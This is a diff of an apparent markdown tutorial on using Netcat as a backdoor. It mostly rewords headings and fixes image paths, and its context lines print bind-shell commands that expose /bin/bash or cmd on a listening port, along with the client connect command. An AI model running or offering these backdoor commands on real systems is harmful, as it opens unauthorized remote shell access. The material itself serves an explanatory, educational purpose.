@@ -14,9 +14,9 @@ Netcat (or nc) is a command-line utility that reads and writes data across netwo
 Netcat is cross-platform, and it is available for Linux, macOS, Windows, and BSD. You can use Netcat to debug and monitor network connections, scan for open ports, transfer data, as a proxy, and more.
 
 
-### Use 'nc' as backdoor for remote cmd execution
-#### The easy way
-Earlier the **nc** command supported the **'-e'** flag which allowed the client to execute commands on the server and receive the output. This command flag may not be available anymore today on modern systems (specially macOS). But for completeness here is an example of how to use it.
+### Use 'nc' as backdoor for remote command execution
+#### The easy / original way 
+Earlier the **nc** command supported the **'-e'** flag which allowed the client to execute commands on the server and receive the output back on the client. This command flag may not be available anymore today on modern systems (specially macOS). But for completeness here is an example of how to use it.
 
 **Server**
 
@@ -26,14 +26,14 @@ nc -l <Port> -e <command to execute>
 nc -l 9999 -e /bin/bash
 ```
 
-On Windows
+On Windows (Windows needs the **-p** flag for specifying the port)
 
 ```bash
 nc -l -p <Port> -e <command to execute>
 ...
 nc -l -p 6969 -e cmd
 ```
-![](../assets/img/nc-backdoor/2023-12-20-NC-Setup-Server-Windows-NC-E-sized.png)
+![_Setup Server on Windows_](../../assets/img/nc-backdoor/2023-12-20-NC-Setup-Server-Windows-NC-E-sized.png)
 
 **Client**
 
@@ -51,7 +51,7 @@ nc <hostaddress> <Port>
 nc 192.168.64.2 6969
 ```
 
-![](../assets/img/nc-backdoor/2023-12-20-NC-Setup-Client-macOS-E-sized.png)
+![_Setup Client on macOS_](../../assets/img/nc-backdoor/2023-12-20-NC-Setup-Client-macOS-E-sized.png)
 
 Output on client will be something like:
 
